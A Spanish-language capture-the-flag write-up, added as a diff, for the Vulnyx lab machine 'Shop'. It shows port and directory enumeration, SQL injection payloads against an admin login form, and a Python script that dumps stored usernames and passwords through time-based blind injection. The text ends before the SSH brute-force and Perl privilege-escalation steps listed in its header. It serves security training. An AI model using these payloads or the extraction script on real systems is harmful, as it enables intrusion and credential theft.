@@ -1,0 +1,115 @@
+Nombre: Shop
+Dificultad: Easy
+Plataforma: Vulnyx --> https://mega.nz/file/gLxSBQgA#vGX0ZobWAK4laFclsK0ZX8u-1CHvm7Eg6CcoJOTrOJo
+
+-------------------------------------------
+Time-Based Blind SQL Injection
+SSH Brute Force
+Privilege Escalation Perl Capabilities
+-------------------------------------------
+
+·Enumeracio:
+  Escaneo De Puertos:
+    PORT   STATE SERVICE
+    22/tcp open  ssh
+    80/tcp open  http
+  Escaneo De Servicios:
+    PORT   STATE SERVICE VERSION
+    22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
+    | ssh-hostkey: 
+    |   2048 ce2421a92a9e702a50aed3d431ab01ba (RSA)
+    |   256 6b653b41b3630b12bad369ac14de397f (ECDSA)
+    |_  256 04cbd99b40cc2858fc03e74ff76ae572 (ED25519)
+    80/tcp open  http    Apache httpd 2.4.38 ((Debian))
+    |_http-title: VulNyx Shop
+    |_http-server-header: Apache/2.4.38 (Debian)
+    Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+    
+    Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+    Nmap done: 1 IP address (1 host up) scanned in 7.84 seconds
+·Reconocimento Web
+# En El Puerto 80 Podemos Visualizar Una Pagina Web Estatica De Una Tienda
+  · Fuerza Bruta Fuzzing De Directorios:
+        wfuzz -c --hw=31,247 -t 200 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u "http://192.168.1.102/FUZZ"
+        ********************************************************
+        * Wfuzz 3.1.0 - The Web Fuzzer                         *
+        ********************************************************
+        
+        Target: http://192.168.1.102/FUZZ
+        Total requests: 220560
+        
+        =====================================================================
+        ID           Response   Lines    Word       Chars       Payload                                                          
+        =====================================================================
+        
+        000000550:   301        9 L      28 W       312 Ch      "css"                                                            
+        000002771:   301        9 L      28 W       314 Ch      "fonts"                                                          
+        000005689:   301        9 L      28 W       322 Ch      "administrator"                                                  
+        000000953:   301        9 L      28 W       311 Ch      "js"
+        #Podemos Visualizar Un Directorio LLamdo administrator Es el Q mayor Intriga Nos genera
+        #Visualizo la ruta administrator y veo un panel de login.
+  · Procedemos A Interceptar Burpsuite Y encontrar Un fallo:
+    
+    #procedemos a hacer Injecciones Sql a la peticion Por Post
+    
+    username=asas' or 1=1-- -&password=asasas&submit=    
+    username=asas' or '2'='1&password=asasas&submit=    
+    username=asas' or '2'='2' and sleep(5)-- -&password=asasas&submit= al Enviar Esta Peticion nos llama la atencion como la Pagina responde demorando 5 segundo eso significa que la consulta es Verdadera  es decir si 1=1 entonces que nos espere 5 segundo
+    # siendo Un Atacante Nos podemos Aprovechar de eso de la siguente manera
+    username=asas' or if(substr(database(),1,1)='a',sleep(5),1)-- -&password=asasas&submit=
+    #al Proporcionar esta consulta nosotros le preguntamos a la base de datos Si El Primer caracter de la primera base de datos es a entonces que espere 5 segundos de lo contrario que espere 1
+  
+    username=asas' or if(substr(database(),1,1)='w',sleep(5),1)--+-&password=asasas&submit=
+    # Lo mismo Con esta consulta pero en este caso la base de datos nos responde con 5 segundos eso quiero decir q la respuesta es verdadera que la base de datos empieza con w con tal informacion podemos Crear Un script en python que nos automatize el trabajo
+· Explotacion de la vulneravilidad con python:
+    
+    import requests
+    from pwn import *
+    import string
+    import sys,signal
+    #Controlamos El Flujo Del Programa Al salir con control c
+    def ctrl(sig, frame):
+        print("\n[!]Saliendo...")
+        sys.exit(1) 
+    signal.signal(signal.SIGINT, ctrl)
+    
+    
+    #definimos una variable global
+    base_url="http://192.168.1.102/administrator/index.php"
+
+    #creamos Una Funcion llamada Atack() que nos enviara una peticion por caracter a la web y detectara si la web tardo 2 segundo en responde si tardo 2 segundo en responder entonces se agrega un caracter a la variable database
+    def Atack():
+        p1=log.progress("Iniciando Fuerza Bruta")
+        p1.status("Sql Injection")
+        time.sleep(2)
+        p2=log.progress("Databases: ")
+        database=""
+        caracteres = string.ascii_lowercase + string.ascii_uppercase + string.digits + string.punctuation
+        for e in range(0,2):
+            for i in range(1,20):
+                for c in caracteres:
+                    dt = {
+                    "username": f"asdad' or if(substr((select group_concat(username,0x3a,password) from Users),{i},1)='{c}',sleep(3),1)-- -",
+                    "password":'1234568',
+                    "submit" : 'Submit'
+                    }
+                    p1.status(dt["username"])
+                    time.sleep(0.2)
+    
+                    inicio = time.time()
+                    r = requests.post(base_url,data=dt)
+                    fin = time.time()
+    
+                    if fin - inicio > 2:
+                        database += c
+    
+                        p2.status(f"DB [Webapp]: TB:[users] CL:[Username:Password] Data:[{database}]")
+                        break
+            database +=','
+    if __name__ == '__main__':
+        try:
+            Atack()
+        except Exception as e:
+            print('[-] error: %s' % e)
+    
+      
